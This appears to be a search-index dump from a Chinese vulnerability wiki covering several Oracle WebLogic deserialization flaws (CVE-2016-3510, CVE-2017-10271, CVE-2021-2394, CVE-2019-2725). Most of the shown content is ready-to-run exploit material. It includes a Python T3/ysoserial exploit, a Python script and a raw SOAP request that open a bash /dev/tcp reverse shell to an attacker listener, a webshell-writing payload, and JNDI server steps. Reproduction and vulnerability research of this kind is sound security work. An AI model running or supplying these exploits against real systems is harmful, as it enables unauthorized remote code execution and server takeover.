","date":"0001-01-01","objectID":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/:1:0","tags":null,"title":"","uri":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/"},{"categories":null,"content":"漏洞影响 Oracle WebLogic Server 12.2.1.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.1.2.0 Oracle WebLogic Server 10.3.6.0 ","date":"0001-01-01","objectID":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/:2:0","tags":null,"title":"","uri":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/"},{"categories":null,"content":"漏洞EXP #!/usr/bin/env python2 #Oracle WebLogic Server Java Object Deserialization RCE (CVE-2016-3510) #Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits) #Made with \u003c3 by @byt3bl33d3r from __future__ import print_function import socket import struct import argparse import os import sys from subprocess import check_output ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar'] ysoserial_path = None parser = argparse.ArgumentParser() parser.add_argument('target', type=str, help='Target IP:PORT') parser.add_argument('command', type=str, help='Command to run on target') parser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)') if len(sys.argv) \u003c 2: parser.print_help() sys.exit(1) args = parser.parse_args() if not args.ysoserial_path: for path in ysoserial_default_paths: if os.path.exists(path): ysoserial_path = path else: if os.path.exists(args.ysoserial_path): ysoserial_path = args.ysoserial_path if len(args.target.split(':')) != 2: print('[-] Target must be in format IP:PORT') sys.exit(1) if not args.command: print('[-] You must specify a command to run') sys.exit(1) ip, port = args.target.split(':') sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print('[*] Target IP: {}'.format(ip)) print('[*] Target PORT: {}'.format(port)) sock.connect((ip, int(port))) # Send headers headers='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n' print('[*] Sending header') sock.sendall(headers) data = sock.recv(1024) print('[*] Received: \"{}\"'.format(data)) payloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections1', args.command]) payload = '\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00' payload += payloadObj payload += '\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x6","date":"0001-01-01","objectID":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/:3:0","tags":null,"title":"","uri":"/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-3510/"},{"categories":null,"content":"Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:0:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"漏洞描述 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:1:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"漏洞影响 Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:2:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:3:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"漏洞复现 对 http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType 进行访问，存在这个url则可能存在漏洞 其他可利用URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 使用POST方法上传以下数据反弹一个shell \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Header\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e \u003carray class=\"java.lang.String\" length=\"3\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003e/bin/bash\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"1\"\u003e \u003cstring\u003e-c\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"2\"\u003e \u003cstring\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/21 0\u0026gt;\u0026amp;1\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e \u003c/work:WorkContext\u003e \u003c/soapenv:Header\u003e \u003csoapenv:Body/\u003e \u003c/soapenv:Envelope\u003e 使用Curl反弹shell (将上面的xml数据保存为poc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" 也可以通过漏洞写入webshell文件 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Header\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cjava\u003e\u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cobject class=\"java.io.PrintWriter\"\u003e \u003cstring\u003eservers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp\u003c/string\u003e \u003cvoid method=\"println\"\u003e\u003cstring\u003e \u003c![CDATA[ \u003c% out.print(\"test\"); %\u003e ]]\u003e \u003c/string\u003e \u003c/void\u003e \u003cvoid method=\"close\"/\u003e \u003c/object\u003e\u003c/java\u003e\u003c/java\u003e \u003c/work:WorkContext\u003e \u003c/soapenv:Header\u003e \u003csoapenv:Body/\u003e \u003c/soapenv:Envelope\u003e 访问 http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp 即可得到写入的文件 ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:4:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"漏洞POC 利用 weblogic-scan 快速检测 反弹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Header\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e \u003carray class=\"java.lang.String\" length=\"3\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003e/bin/bash\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"1\"\u003e \u003cstring\u003e-c\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"2\"\u003e \u003cstring\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e \u003c/work:WorkContext\u003e \u003c/soapenv:Header\u003e \u003csoapenv:Body/\u003e \u003c/soapenv:Envelope\u003e \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) IP = str(input(\"\\033[35m请输入监听IP \u003e\u003e\u003e \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, IP, PORT) ","date":"0001-01-01","objectID":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/:5:0","tags":null,"title":"","uri":"/weblogic-xmldecoder-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-10271/"},{"categories":null,"content":"Weblogic 二次反序列化漏洞 CVE-2021-2394 ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:0:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"漏洞描述 Oracle官方发布了2021年7月份安全更新通告，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。 这是一个二次反序列化漏洞，是CVE-2020-14756和CVE-2020-14825的调用链相结合组成一条新的调用链来绕过weblogic黑名单列表。 ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:1:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"漏洞影响 Oracle WebLogic Server 10.3.6.0.0 Oracle WebLogic Server 12.1.3.0.0 Oracle WebLogic Server 12.2.1.3.0 Oracle WebLogic Server 12.2.1.4.0 Oracle WebLogic Server 14.1.1.0.0 ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:2:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"环境搭建 系统环境：window10 系统 weblogic 版本：12.2.1.3，官网下载 在当前目录启动，启动后访问： ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:3:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"漏洞复现 下载 marshalsec 利用 marshalsec 开启 JNDI 服务： https://github.com/mbechler/marshalsec # 需要自己编译 mvn clean package –DskipTests https://github.com/RandomRobbieBF/marshalsec-jar # 可以直接使用 创建 Exploit.java，通过 javac 编译得到 Exploit.class： public class Exploit { static { System.err.println(\"Pwned\"); try { String cmds = \"calc\"; Runtime.getRuntime().exec(cmds); } catch ( Exception e ) { e.printStackTrace(); } } } 在同目录下使用 python 开启一个 http 服务，并使用 marshalsec 开启 JNDI 服务： python -m http.server 8000 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/#Exploit\" 8087 使用exp进行复现： https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0 java -jar CVE_2021_2394.jar 192.168.31.3 7001 ldap://192.168.3.35:8087/Exploit ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:4:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"修复方式 当前官方已发布受影响版本的对应补丁，建议受影响的用户及时更新官方的安全补丁。链接如下： https://www.oracle.com/security-alerts/cpuapr2021.html ","date":"0001-01-01","objectID":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/:5:0","tags":null,"title":"","uri":"/weblogic-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-2394/"},{"categories":null,"content":"Weblogic 反序列化远程代码执行漏洞 CVE-2019-2725 ","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:0:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"漏洞描述 2019年06月15日，360CERT监测到在野的Oracle Weblogic远程反序列化命令执行漏洞，该漏洞绕过了最新的Weblogic补丁（CVE-2019-2725），攻击者可以发送精心构造的恶意HTTP请求，在未授权的情况下远程执行命令。目前官方补丁未发布，漏洞细节未公开。360CERT经研判后判定该漏洞综合评级为“高危”，强烈建议受影响的用户尽快根据临时修补建议进行临时处置，防止收到攻击者攻击。 ","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:1:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"漏洞影响 Weblogic 10.3.6 Weblogic 12.1.3 ","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:2:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:7001 正常即可 ","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:3:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"漏洞复现 漏洞分析文章: https://xz.aliyun.com/t/5024 这里使用POC进行复现 POC地址: https://github.com/TopScrew/CVE-2019-2725 POC可利用于命令执行和Webshell上传 ","date":"0001-01-01","objectID":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/:4:0","tags":null,"title":"","uri":"/weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-2725/"},{"categories":null,"content":"漏洞POC https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", } def weblogic_10_3_6(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", \"cmd\":\"%s\"%(cmd) } body = \"\"\"\u003c?xml version=\"1.0\" encoding=\"utf-8\" ?\u003e \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"\u003e \u003csoapenv:Header\u003e \u003cwsa:Action/\u003e\u003cwsa:RelatesTo/\u003e\u003casy:onAsyncDelivery/\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cclass\u003e\u003cstring\u003eoracle.toplink.internal.sessions.UnitOfWorkChangeSet\u003c/string\u003e\u003cvoid\u003e \u003carray class=\"byte\" length=\"5010\"\u003e\u003cvoid index=\"0\"\u003e\u003cbyte\u003e-84\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"1\"\u003e\u003cbyte\u003e-19\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"2\"\u003e\u003cbyte\u003e0\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"3\"\u003e\u003cbyte\u003e5\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"4\"\u003e\u003cbyte\u003e115\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"5\"\u003e\u003cbyte\u003e114\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"6\"\u003e\u003cbyte\u003e0\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"7\"\u003e\u003cbyte\u003e23\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"8\"\u003e\u003cbyte\u003e106\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"9\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"10\"\u003e\u003cbyte\u003e118\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"11\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"12\"\u003e\u003cbyte\u003e46\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"13\"\u003e\u003cbyte\u003e117\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"14\"\u003e\u003cbyte\u003e116\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"15\"\u003e\u003cbyte\u003e105\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"16\"\u003e\u003cbyte\u003e108\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"17\"\u003e\u003cbyte\u003e46\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"18\"\u003e\u003cbyte\u003e76\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"19\"\u003e\u003cbyte\u003e105\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"20\"\u003e\u003cbyte\u003e110\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"21\"\u003e\u003cbyte\u003e107\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"22\"\u003e\u003cbyte\u003e101\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"23\"\u003e\u003cbyte\u003e100\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"24\"\u003e\u003cbyte\u003e72\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"25\"\u003e\u003cbyte\u003e97\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"26\"\u003e\u003cbyte\u003e115\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"27\"\u003e\u003cbyte\u003e104\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"28\"\u003e\u003cbyte\u003e83\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"29\"\u003e\u003cbyte\u003e101\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"30\"\u003e\u003cbyte\u003e116\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"31\"\u003e\u003cbyte\u003e-40\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"32\"\u003e\u003cbyte\u003e108\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"33\"\u003e\u003cbyte\u003e-41\u003c/byte\u003e\u003c/void\u003e\u003cvoid index=\"34\"\u003e\u003cbyte\u003e90\u003c/byte\u003e\u003c/void\u003e\u003cvoid 